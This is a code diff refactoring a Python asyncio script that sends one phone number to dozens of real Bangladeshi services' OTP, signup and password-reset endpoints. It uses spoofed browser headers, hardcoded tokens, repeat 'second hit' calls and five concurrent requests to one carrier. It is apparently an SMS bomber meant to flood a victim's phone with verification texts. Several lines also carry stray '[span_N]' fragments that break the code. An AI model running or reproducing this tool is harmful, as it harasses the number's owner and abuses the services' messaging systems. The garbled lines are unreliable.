@@ -27,32 +27,32 @@ async def safe_request(
     try:
         async with session.request(method, url, ssl=False, **kwargs) as response:
             text = await response.text()
-            return {
-                "api": name,
-                "status": response.status,
-                "response": text,
-            }
+            return {"api": name, "status": response.status, "response": text}
     except Exception as e:
-        return {
-            "api": name,
-            "status": "error",
-            "error": str(e),
-        }
+        return {"api": name, "status": "error", "error": str(e)}
 
 
-# api1.php -> RedX
+# RedX
 async def hit_api1(session: aiohttp.ClientSession, phone: str) -> dict:
     url = "https://api.redx.com.bd:443/v1/user/signup"
     payload = {"name": phone, "service": "redx", "phoneNumber": phone}
-    headers = {"Content-Type": "application/json"}
-    return await safe_request(session, "api1_redx", "POST", url, json=payload, headers=headers)
+    return await safe_request(
+        session, "api1_redx", "POST", url, json=payload, headers={"Content-Type": "application/json"}
+    )
 
 
-# api2.php -> KhaasFood (2 Steps)
+# KhaasFood (2 Steps)
 async def hit_api2(session: aiohttp.ClientSession, phone: str) -> dict:
     url = "https://www.khaasfood.com/wp-admin/admin-ajax.php"
     csrf = "9d9d08e6e5"
-
+    headers = {
+        "accept": "application/json, text/javascript, */*; q=0.01",
+        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
+        "origin": "https://www.khaasfood.com",
+        "referer": "https://www.khaasfood.com/",
+        "x-requested-with": "XMLHttpRequest",
+        "user-agent": "Mozilla/5.0",
+    }
     data1 = {
         "mobileNo": phone,
         "countrycode": "+880",
@@ -61,16 +61,6 @@ async def hit_api2(session: aiohttp.ClientSession, phone: str) -> dict:
         "json": "1",
         "action": "digits_check_mob",
     }
-    headers1 = {
-        "accept": "application/json, text/javascript, */*; q=0.01",
-        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
-        "origin": "https://www.khaasfood.com",
-        "referer": "https://www.khaasfood.com/",
-        "x-requested-with": "XMLHttpRequest",
-        "user-agent": "Mozilla/5.0",
-    }
-    res1 = await safe_request(session, "api2_khaasfood_step1", "POST", url, data=data1, headers=headers1)
-
     data2 = {
         "mobileNo": phone,
         "digits_reg_mail": phone,
@@ -85,46 +75,39 @@ async def hit_api2(session: aiohttp.ClientSession, phone: str) -> dict:
         "json": "1",
         "csrf": csrf,
     }
-    headers2 = {
-        "accept": "*/*",
-        "origin": "https://www.khaasfood.com",
-        "referer": "https://www.khaasfood.com/",
-        "x-requested-with": "XMLHttpRequest",
-        "user-agent": "Mozilla/5.0",
-    }
-    res2 = await safe_request(session, "api2_khaasfood_step2", "POST", url, data=data2, headers=headers2)
-
+    res1 = await safe_request(session, "api2_khaasfood_step1", "POST", url, data=data1, headers=headers)
+    res2 = await safe_request(session, "api2_khaasfood_step2", "POST", url, data=data2, headers=headers)
     return {"api": "api2_khaasfood", "step1": res1, "step2": res2}
 
 
-# api3.php -> Bioscope
+# Bioscope
 async def hit_api3(session: aiohttp.ClientSession, phone: str) -> dict:
     url = "https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web&language=en"
-    payload = {"number": f"+88{phone}"}
     headers = {
         "accept": "application/json",
         "content-type": "application/json",
         "origin": "https://www.bioscopeplus.com",
         "referer": "https://www.bioscopeplus.com/",
-        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36",
+        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
     }
-    return await safe_request(session, "api3_bioscope", "POST", url, json=payload, headers=headers)
+    return await safe_request(
+        session, "api3_bioscope", "POST", url, json={"number": f"+88{phone}"}, headers=headers
+    )
 
 
-# api4.php -> Bikroy
+# Bikroy
 async def hit_api4(session: aiohttp.ClientSession, phone: str) -> dict:
     url = f"https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={quote(phone)}"
     headers = {
         "accept": "application/json, text/plain, */*",
-        "accept-language": "en",
         "application-name": "web",
         "referer": "https://bikroy.com/en?login-modal=true&redirect-url=/en",
-        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
+        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
     }
     return await safe_request(session, "api4_bikroy", "GET", url, headers=headers)
 
 
-# api5.php -> Proiojon
+# Proiojon
 async def hit_api5(session: aiohttp.ClientSession, phone: str) -> dict:
     url = "https://billing.proiojon.com/api/v1/auth/sign-up"
     payload = {
@@ -138,22 +121,17 @@ async def hit_api5(session: aiohttp.ClientSession, phone: str) -> dict:
         "accept": "*/*",
         "authorization": "Bearer null",
         "content-type": "application/json; charset=UTF-8",
-        "latitude": '"23.542089492895155"',
-        "longitude": '"89.1771454546833"',
         "origin": "https://proiojon.com",
         "referer": "https://proiojon.com/",
-        "x-localization": "en",
-        "zoneid": "[2]",
-        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36",
+        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
     }
     return await safe_request(session, "api5_proiojon", "POST", url, json=payload, headers=headers)
 
 
-# api7.php -> Medha
+# Medha
 async def hit_api7(session: aiohttp.ClientSession, phone: str) -> dict:
     url = "https://developer.medha.info/api/send-otp"
-    formatted_phn = "880" + phone.lstrip("0")
-    payload = {"phone": formatted_phn, "is_register": "1"}
+    payload = {"phone": "880" + phone.lstrip("0"), "is_register": "1"}
     headers = {
         "User-Agent": "Dart/3.2 (dart:io)",
         "content-type": "application/json; charset=utf-8",
@@ -162,7 +140,7 @@ async def hit_api7(session: aiohttp.ClientSession, phone: str) -> dict:
     return await safe_request(session, "api7_medha", "POST", url, json=payload, headers=headers)
 
 
-# api9.php -> Robi
+# Robi
 async def hit_api9(session: aiohttp.ClientSession, phone: str) -> dict:
     url = "https://webapi.robi.com.bd/v1/send-otp"
     payload = {"phone_number": phone, "type": "doorstep"}
@@ -173,7 +151,7 @@ async def hit_api9(session: aiohttp.ClientSession, phone: str) -> dict:
     return await safe_request(session, "api9_robi", "POST", url, json=payload, headers=headers)
 
 
-# api10.php -> Arogga (Web)
+# Arogga (Web)
 async def hit_api10(session: aiohttp.ClientSession, phone: str) -> dict:
     url = "https://api.arogga.com/auth/v1/sms/send/?f=web&b=Chrome&v=122.0.0.0&os=Windows&osv=10"
     form = aiohttp.FormData()
@@ -184,12 +162,12 @@ async def hit_api10(session: aiohttp.ClientSession, phone: str) -> dict:
         "accept": "*/*",
         "origin": "https://www.arogga.com",
         "referer": "https://www.arogga.com/",
-        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
+        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
     }
     return await safe_request(session, "api10_arogga_web", "POST", url, data=form, headers=headers)
 
 
-# api11.php -> Cinematic (MyGP)
+# Cinematic (MyGP)
 async def hit_api11(session: aiohttp.ClientSession, phone: str) -> dict:
     url = f"https://api.mygp.cinematic.mobi/api/v1/send-common-otp/wap/{quote(phone)}"
     payload = {
@@ -204,49 +182,42 @@ async def hit_api11(session: aiohttp.ClientSession, phone: str) -> dict:
         "Content-Type": "application/json;charset=UTF-8",
         "Origin": "https://cinematic.mobi",
         "Referer": "https://cinematic.mobi/",
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
     }
     return await safe_request(session, "api11_cinematic", "POST", url, json=payload, headers=headers)
 
 
-# api12.php -> BDStall
+# BDStall
 async def hit_api12(session: aiohttp.ClientSession, phone: str) -> dict:
     url = "https://www.bdstall.com/userRegistration/save_otp_info/"
-    fields = {
-        "UserTypeID": "2",
-        "RequestType": "1",
-        "Name": "Md",
-        "Mobile": phone,
-    }
+    fields = {"UserTypeID": "2", "RequestType": "1", "Name": "Md", "Mobile": phone}
     return await safe_request(session, "api12_bdstall", "POST", url, data=fields)
 
 
-# api15.php -> Sheba AccountKit
+# Sheba AccountKit
 async def hit_api15(session: aiohttp.ClientSession, phone: str) -> dict:
     app_id = "8329815A6D1AE6DD"
-    token_url = f"https://accounts.sheba.xyz/api/v1/accountkit/generate/token?app_id={app_id}"
-    token_res = await safe_request(session, "api15_sheba_token", "GET", token_url)
-
+    token_res = await safe_request(
+        session, "api15_sheba_token", "GET", f"https://accounts.sheba.xyz/api/v1/accountkit/generate/token?app_id={app_id}"
+    )
     api_token = ""
     try:
-        token_json = json.loads(token_res.get("response", "{}"))
-        api_token = token_json.get("token", "")
+        api_token = json.loads(token_res.get("response", "{}")).get("token", "")
     except Exception:
         pass
 
-    otp_url = "https://accountkit.sheba.xyz/api/shoot-otp"
-    payload = {
-        "mobile": f"+88{phone}",
-        "app_id": app_id,
-        "api_token": api_token,
-    }
-    headers = {"Content-Type": "application/json"}
-    otp_res = await safe_request(session, "api15_sheba_otp", "POST", otp_url, json=payload, headers=headers)
-
+    otp_res = await safe_request(
+        session,
+        "api15_sheba_otp",
+        "POST",
+        "https://accountkit.sheba.xyz/api/shoot-otp",
+        json={"mobile": f"+88{phone}", "app_id": app_id, "api_token": api_token},
+        headers={"Content-Type": "application/json"},
+    )
     return {"api": "api15_sheba", "token_step": token_res, "otp_step": otp_res}
 
 
-# api20.php -> Circle Reseller
+# Circle Reseller
 async def hit_api20(session: aiohttp.ClientSession, phone: str) -> dict:
     url = "https://reseller.circle.com.bd/api/v2/auth/signup"
     payload = {
@@ -263,123 +234,108 @@ async def hit_api20(session: aiohttp.ClientSession, phone: str) -> dict:
     return await safe_request(session, "api20_circle", "POST", url, json=payload, headers=headers)
 
 
-# api26.php -> Chorcha
+# Chorcha
 async def hit_api26(session: aiohttp.ClientSession, phone: str) -> dict:
     url = f"https://mujib.chorcha.net/auth/check?phone={quote(phone)}"
-    headers = {
-        "accept": "*/*",
-        "x-chorcha-mode": "prod",
-        "x-chorcha-platform": "web",
-        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
-    }
+    headers = {"accept": "*/*", "x-chorcha-mode": "prod", "x-chorcha-platform": "web"}
     return await safe_request(session, "api26_chorcha", "GET", url, headers=headers)
 
 
-# api29.php -> Chardike
+# Chardike
 async def hit_api29(session: aiohttp.ClientSession, phone: str) -> dict:
     url = "https://api.chardike.com/api/otp/send"
-    payload = {"phone": phone, "otp_type": "login"}
     headers = {
         "accept": "*/*",
         "content-type": "application/json",
         "origin": "https://chardike.com",
         "referer": "https://chardike.com/",
-        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36",
+        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
     }
-    return await safe_request(session, "api29_chardike", "POST", url, json=payload, headers=headers)
+    return await safe_request(
+        session, "api29_chardike", "POST", url, json={"phone": phone, "otp_type": "login"}, headers=headers
+    )
 
 
-# api31.php -> Grameenphone GPay CheckSignup
+# Applink helper
+async def _hit_applink(session: aiohttp.ClientSession, name: str, phone: str) -> dict:
+    url = "https://apps.applink.com.bd/appstore-v4-server/login/otp/request"
+    headers = {
+        "Accept": "*/*",
+        "Content-Type": "application/json",
+        "Origin": "https://applink.com.bd",
+        "Referer": "https://applink.com.bd/",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+    }
+    return await safe_request(session, name, "POST", url, json={"msisdn": f"88{phone}"}, headers=headers)
+
+
+# Salextra helper
+async def _hit_salextra(session: aiohttp.ClientSession, name: str, phone: str) -> dict:
+    url = "https://salextra.com.bd/customer/checkusernameavailabilityonregistration"
+    form_data = {
+        "username": phone,
+        "loginType": "MOBILE",
+        "__RequestVerificationToken": "CfDJ8LiTcoRywYZJiSdmMqGF8TUqJw9C6KMdGm1h66OVTdHacNf0PM5Ejsmu_DNPddqz7Sk-XUyXwxIyHALKpZ5bn1jwr9l-9IzOmASY_Z3cKb2mndEZn3KyLqq80U8QyitKCPtmt1zxxiMWd_970_jfTmg",
+    }
+    headers = {
+        "accept": "application/json, text/javascript, */*; q=0.01",
+        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
+        "origin": "https://salextra.com.bd",
+        "referer": "https://salextra.com.bd/register?returnUrl=%2F",
+        "x-requested-with": "XMLHttpRequest",
+        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+    }
+    return await safe_request(session, name, "POST", url, data=form_data, headers=headers)
+
+
+# Osudpotro helper
+async def _hit_osudpotro(session: aiohttp.ClientSession, name: str, phone: str) -> dict:
+    url = "https://api.osudpotro.com/api/v1/users/send_otp"
+    payload = {"mobile": f"+88-{phone}", "deviceToken": "app", "language": "bn", "os": "android"}
+    headers = {
+        "Content-Type": "application/json",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0",
+    }
+    return await safe_request(session, name, "POST", url, json=payload, headers=headers)
+
+
+# Grameenphone GPay CheckSignup
 async def hit_api31(session: aiohttp.ClientSession, phone: str) -> dict:
     url = "https://gpayapp.grameenphone.com/prod_mfs/sub/user/checksignup"
-    payload = {
-        "deviceId": f"35{phone}30",
-        "msisdn": phone,
-        "tran_type": "OTPREQSIGNUP",
-    }
-    headers = {"Content-Type": "application/json"}
-    return await safe_request(session, "api31_gpay", "POST", url, json=payload, headers=headers)
+    payload = {"deviceId": f"35{phone}30", "msisdn": phone, "tran_type": "OTPREQSIGNUP"}
+    return await safe_request(
+        session, "api31_gpay", "POST", url, json=payload, headers={"Content-Type": "application/json"}
+    )[span_10](start_span)[span_10](end_span)
 
 
-# api32.php -> Applink
 async def hit_api32(session: aiohttp.ClientSession, phone: str) -> dict:
-    url = "https://apps.applink.com.bd/appstore-v4-server/login/otp/request"
-    payload = {"msisdn": f"88{phone}"}
-    headers = {
-        "Accept": "*/*",
-        "Content-Type": "application/json",
-        "Origin": "https://applink.com.bd",
-        "Referer": "https://applink.com.bd/",
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36",
-    }
-    return await safe_request(session, "api32_applink", "POST", url, json=payload, headers=headers)
+    return await _hit_applink(session, "api32_applink", phone)[span_11](start_span)[span_11](end_span)
 
 
-# api32_2.php -> Applink (2nd hit)
 async def hit_api32_2(session: aiohttp.ClientSession, phone: str) -> dict:
-    url = "https://apps.applink.com.bd/appstore-v4-server/login/otp/request"
-    payload = {"msisdn": f"88{phone}"}
-    headers = {
-        "Accept": "*/*",
-        "Content-Type": "application/json",
-        "Origin": "https://applink.com.bd",
-        "Referer": "https://applink.com.bd/",
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36",
-    }
-    return await safe_request(session, "api32_2_applink", "POST", url, json=payload, headers=headers)
+    return await _hit_applink(session, "api32_2_applink", phone)[span_12](start_span)[span_12](end_span)
 
 
-# api33.php -> Priyo Shikkhaloy
+# Priyo Shikkhaloy
 async def hit_api33(session: aiohttp.ClientSession, phone: str) -> dict:
     url = "https://app.priyoshikkhaloy.com/api/user/register-login.php"
-    form_data = {"mobile": phone}
     headers = {
         "User-Agent": "okhttp/4.11.0",
         "Accept-Encoding": "gzip",
         "Content-Type": "application/x-www-form-urlencoded",
     }
-    return await safe_request(session, "api33_priyoshikkhaloy", "POST", url, data=form_data, headers=headers)
+    return await safe_request(session, "api33_priyoshikkhaloy", "POST", url, data={"mobile": phone}, headers=headers)[span_13](start_span)[span_13](end_span)
 
 
-# api35.php -> Salextra
 async def hit_api35(session: aiohttp.ClientSession, phone: str) -> dict:
-    url = "https://salextra.com.bd/customer/checkusernameavailabilityonregistration"
-    form_data = {
-        "username": phone,
-        "loginType": "MOBILE",
-        "__RequestVerificationToken": "CfDJ8LiTcoRywYZJiSdmMqGF8TUqJw9C6KMdGm1h66OVTdHacNf0PM5Ejsmu_DNPddqz7Sk-XUyXwxIyHALKpZ5bn1jwr9l-9IzOmASY_Z3cKb2mndEZn3KyLqq80U8QyitKCPtmt1zxxiMWd_970_jfTmg",
-    }
-    headers = {
-        "accept": "application/json, text/javascript, */*; q=0.01",
-        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
-        "origin": "https://salextra.com.bd",
-        "referer": "https://salextra.com.bd/register?returnUrl=%2F",
-        "x-requested-with": "XMLHttpRequest",
-        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36",
-    }
-    return await safe_request(session, "api35_salextra", "POST", url, data=form_data, headers=headers)
+    return await _hit_salextra(session, "api35_salextra", phone)[span_14](start_span)[span_14](end_span)
 
 
-# api35_2.php -> Salextra (2nd hit)
 async def hit_api35_2(session: aiohttp.ClientSession, phone: str) -> dict:
-    url = "https://salextra.com.bd/customer/checkusernameavailabilityonregistration"
-    form_data = {
-        "username": phone,
-        "loginType": "MOBILE",
-        "__RequestVerificationToken": "CfDJ8LiTcoRywYZJiSdmMqGF8TUqJw9C6KMdGm1h66OVTdHacNf0PM5Ejsmu_DNPddqz7Sk-XUyXwxIyHALKpZ5bn1jwr9l-9IzOmASY_Z3cKb2mndEZn3KyLqq80U8QyitKCPtmt1zxxiMWd_970_jfTmg",
-    }
-    headers = {
-        "accept": "application/json, text/javascript, */*; q=0.01",
-        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
-        "origin": "https://salextra.com.bd",
-        "referer": "https://salextra.com.bd/register?returnUrl=%2F",
-        "x-requested-with": "XMLHttpRequest",
-        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36",
-    }
-    return await safe_request(session, "api35_2_salextra", "POST", url, data=form_data, headers=headers)
+    return await _hit_salextra(session, "api35_2_salextra", phone)[span_15](start_span)[span_15](end_span)
 
 
-# api36.php -> Sundora
+# Sundora
 async def hit_api36(session: aiohttp.ClientSession, phone: str) -> dict:
     url = "https://api.sundora.com.bd/api/user/customer/"
     formatted_phone = "+880" + phone[1:] if len(phone) > 1 and phone.startswith("0") else f"+88{phone}"
@@ -406,10 +362,10 @@ async def hit_api36(session: aiohttp.ClientSession, phone: str) -> dict:
         "Content-Type": "application/json",
         "Origin": "https://sundora.com.bd",
     }
-    return await safe_request(session, "api36_sundora", "POST", url, json=payload, headers=headers)
+    return await safe_request(session, "api36_sundora", "POST", url, json=payload, headers=headers)[span_16](start_span)[span_16](end_span)
 
 
-# api37.php -> MyGP Cinematic OTP
+# MyGP Cinematic OTP
 async def hit_api37(session: aiohttp.ClientSession, phone: str) -> dict:
     url = f"https://api.mygp.cinematic.mobi/api/v1/otp/88{quote(phone)}/SBENT_3GB7D"
     payload = {
@@ -422,41 +378,32 @@ async def hit_api37(session: aiohttp.ClientSession, phone: str) -> dict:
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0",
         "Content-Type": "application/json",
     }
-    return await safe_request(session, "api37_mygp_otp", "POST", url, json=payload, headers=headers)
+    return await safe_request(session, "api37_mygp_otp", "POST", url, json=payload, headers=headers)[span_17](start_span)[span_17](end_span)
 
 
-# api41.php -> Meena Bazar
+# Meena Bazar
 async def hit_api41(session: aiohttp.ClientSession, phone: str) -> dict:
     url = f"https://meenabazardev.com/api/mobile/front/send/otp?CellPhone={quote(phone)}&type=login"
-    headers = {
-        "User-Agent": "Dart/3.2 (dart:io)",
-        "Accept-Encoding": "gzip",
-        "content-type": "application/json",
-    }
+    headers = {"User-Agent": "Dart/3.2 (dart:io)", "Accept-Encoding": "gzip", "content-type": "application/json"}
     return await safe_request(session, "api41_meenabazar", "POST", url, headers=headers)
 
 
-# api43.php -> Iqra Live
+# Iqra Live
 async def hit_api43(session: aiohttp.ClientSession, phone: str) -> dict:
-    url = f"http://apibeta.iqra-live.com/api/v1/sent-otp/{quote(phone)}"
-    return await safe_request(session, "api43_iqralive", "GET", url)
+    return await safe_request(session, "api43_iqralive", "GET", f"http://apibeta.iqra-live.com/api/v1/sent-otp/{quote(phone)}")
 
 
-# api46.php -> RedX (Alt payload)
+# RedX (Alt payload)
 async def hit_api46(session: aiohttp.ClientSession, phone: str) -> dict:
     url = "https://api.redx.com.bd/v1/user/signup"
-    payload = {
-        "name": phone,
-        "phoneNumber": phone,
-        "service": "redx",
-    }
-    headers = {"Content-Type": "application/json"}
-    return await safe_request(session, "api46_redx_alt", "POST", url, json=payload, headers=headers)
+    payload = {"name": phone, "phoneNumber": phone, "service": "redx"}
+    return await safe_request(
+        session, "api46_redx_alt", "POST", url, json=payload, headers={"Content-Type": "application/json"}
+    )
 
 
-# api49.php -> Ultimate Organic Life
+# Ultimate Organic Life
 async def hit_api49(session: aiohttp.ClientSession, phone: str) -> dict:
-    reg_url = "https://ultimateasiteapi.com/api/register-customer"
     reg_payload = {
         "customer_name": "hu",
         "customer_password": "12345678",
@@ -466,24 +413,32 @@ async def hit_api49(session: aiohttp.ClientSession, phone: str) -> dict:
         "customer_dob": "2000-01-02",
         "customer_gender": "male",
     }
-    reg_headers = {"Content-Type": "application/json"}
-    reg_res = await safe_request(session, "api49_register", "POST", reg_url, json=reg_payload, headers=reg_headers)
-
-    fp_url = "https://ultimateasiteapi.com/api/forget-customer-password"
-    fp_payload = {"user_input": phone}
-    fp_headers = {
-        "accept": "application/json",
-        "content-type": "application/json",
-        "origin": "https://ultimateorganiclife.com",
-        "referer": "https://ultimateorganiclife.com/",
-        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36",
-    }
-    fp_res = await safe_request(session, "api49_forget_password", "POST", fp_url, json=fp_payload, headers=fp_headers)
-
+    reg_res = await safe_request(
+        session,
+        "api49_register",
+        "POST",
+        "https://ultimateasiteapi.com/api/register-customer",
+        json=reg_payload,
+        headers={"Content-Type": "application/json"},
+    )
+    fp_res = await safe_request(
+        session,
+        "api49_forget_password",
+        "POST",
+        "https://ultimateasiteapi.com/api/forget-customer-password",
+        json={"user_input": phone},
+        headers={
+            "accept": "application/json",
+            "content-type": "application/json",
+            "origin": "https://ultimateorganiclife.com",
+            "referer": "https://ultimateorganiclife.com/",
+            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+        },
+    )
     return {"api": "api49_ultimate", "register_step": reg_res, "forget_password_step": fp_res}
 
 
-# api52.php -> KFC BD Register
+# KFC BD Register
 async def hit_api52(session: aiohttp.ClientSession, phone: str) -> dict:
     url = "https://api.kfcbd.com/register"
     rand_str = "".join(random.choices(string.ascii_letters, k=8))
@@ -498,34 +453,27 @@ async def hit_api52(session: aiohttp.ClientSession, phone: str) -> dict:
         "dob": "",
         "otp": None,
     }
-    headers = {
-        "User-Agent": "Dart/3.1 (dart:io)",
-        "Accept-Encoding": "gzip",
-        "Content-Type": "application/json",
-    }
-    return await safe_request(session, "api52_kfcbd", "POST", url, json=payload, headers=headers)
+    headers = {"User-Agent": "Dart/3.1 (dart:io)", "Accept-Encoding": "gzip", "Content-Type": "application/json"}
+    return await safe_request(session, "api52_kfcbd", "POST", url, json=payload, headers=headers)[span_18](start_span)[span_18](end_span)
 
 
-# api53.php -> Grameenphone Offer Send OTP
+# Grameenphone Offer Send OTP
 async def hit_api53(session: aiohttp.ClientSession, phone: str) -> dict:
     url = "https://bkwebsitethc.grameenphone.com/api/v1/offer/send_otp"
-    payload = {"msisdn": phone}
     headers = {
         "Accept": "application/json, text/plain, */*",
         "Content-Type": "application/json",
         "Origin": "https://www.grameenphone.com",
         "Referer": "https://www.grameenphone.com/",
         "lang": "en",
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
     }
-    return await safe_request(session, "api53_gp_offer", "POST", url, json=payload, headers=headers)
+    return await safe_request(session, "api53_gp_offer", "POST", url, json={"msisdn": phone}, headers=headers)[span_19](start_span)[span_19](end_span)
 
 
-# api55.php -> Eat-Z
+# Eat-Z
 async def hit_api55(session: aiohttp.ClientSession, phone: str) -> dict:
     url = "https://api.eat-z.com/auth/customer/app-connect"
-    formatted_phone = "+880" + phone.lstrip("0")
-    payload = {"username": formatted_phone}
     headers = {
         "User-Agent": "okhttp/4.12.0",
         "Accept": "application/json",
@@ -533,51 +481,28 @@ async def hit_api55(session: aiohttp.ClientSession, phone: str) -> dict:
         "x-eatz-apiclient": "ANDROID",
         "content-type": "application/json; charset=UTF-8",
     }
-    return await safe_request(session, "api55_eatz", "POST", url, json=payload, headers=headers)
+    return await safe_request(
+        session, "api55_eatz", "POST", url, json={"username": "+880" + phone.lstrip("0")}, headers=headers
+    )
 
 
-# api56.php -> Osudpotro
 async def hit_api56(session: aiohttp.ClientSession, phone: str) -> dict:
-    url = "https://api.osudpotro.com/api/v1/users/send_otp"
-    payload = {
-        "mobile": f"+88-{phone}",
-        "deviceToken": "app",
-        "language": "bn",
-        "os": "android",
-    }
-    headers = {
-        "Content-Type": "application/json",
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0",
-    }
-    return await safe_request(session, "api56_osudpotro", "POST", url, json=payload, headers=headers)
+    return await _hit_osudpotro(session, "api56_osudpotro", phone)[span_20](start_span)[span_20](end_span)
 
 
-# api56_2.php -> Osudpotro (2nd hit)
 async def hit_api56_2(session: aiohttp.ClientSession, phone: str) -> dict:
-    url = "https://api.osudpotro.com/api/v1/users/send_otp"
-    payload = {
-        "mobile": f"+88-{phone}",
-        "deviceToken": "app",
-        "language": "bn",
-        "os": "android",
-    }
-    headers = {
-        "Content-Type": "application/json",
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0",
-    }
-    return await safe_request(session, "api56_2_osudpotro", "POST", url, json=payload, headers=headers)
+    return await _hit_osudpotro(session, "api56_2_osudpotro", phone)[span_21](start_span)[span_21](end_span)
 
 
-# api57.php -> Kormi24 GraphQL
+# Kormi24 GraphQL
 async def hit_api57(session: aiohttp.ClientSession, phone: str) -> dict:
     url = "https://api.kormi24.com/graphql"
-    additional = json.dumps({"user_agent": "web", "mobile": phone})
     payload = {
         "operationName": "sendOTP",
         "variables": {
             "type": 1,
             "mobile": phone,
-            "additional": additional,
+            "additional": json.dumps({"user_agent": "web", "mobile": phone}),
             "hash": "c3275518789fb74ac6cc30ce030afbf0bdff578579e2fb64571e63f5b2680180",
         },
         "query": (
@@ -592,129 +517,118 @@ async def hit_api57(session: aiohttp.ClientSession, phone: str) -> dict:
         "content-type": "application/json",
         "origin": "https://www.kormi24.com",
         "referer": "https://www.kormi24.com/",
-        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36",
+        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
     }
     return await safe_request(session, "api57_kormi24", "POST", url, json=payload, headers=headers)
 
 
-# api58.php -> Grameenphone WebLogin OTP (5 times concurrently)
+# Grameenphone WebLogin OTP (5 times concurrently)
 async def hit_api58(session: aiohttp.ClientSession, phone: str) -> dict:
     url = "https://weblogin.grameenphone.com/backend/api/v1/otp"
-    payload = {"msisdn": phone}
     headers = {
         "Accept": "application/json, text/plain, */*",
         "Content-Type": "application/json",
         "Origin": "https://weblogin.grameenphone.com",
         "Referer": "https://weblogin.grameenphone.com/?referrer=https://www.grameenphone.com/flexi-plan/",
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
     }
     sub_tasks = [
-        safe_request(session, f"api58_gp_weblogin_{i+1}", "POST", url, json=payload, headers=headers)
+        safe_request(session, f"api58_gp_weblogin_{i+1}", "POST", url, json={"msisdn": phone}, headers=headers)
         for i in range(5)
     ]
-    sub_results = await asyncio.gather(*sub_tasks)
-    return {"api": "api58_gp_weblogin_x5", "responses": sub_results}
+    return {"api": "api58_gp_weblogin_x5", "responses": await asyncio.gather(*sub_tasks)}[span_22](start_span)[span_22](end_span)
 
 
-# api59.php -> Shwapno
+# Shwapno
 async def hit_api59(session: aiohttp.ClientSession, phone: str) -> dict:
     url = "https://www.shwapno.com/api/auth"
-    payload = {"phoneNumber": f"+88{phone}"}
     headers = {
         "accept": "*/*",
         "content-type": "application/json",
         "origin": "https://www.shwapno.com",
         "referer": "https://www.shwapno.com/",
-        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36",
+        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
     }
-    return await safe_request(session, "api59_shwapno", "POST", url, json=payload, headers=headers)
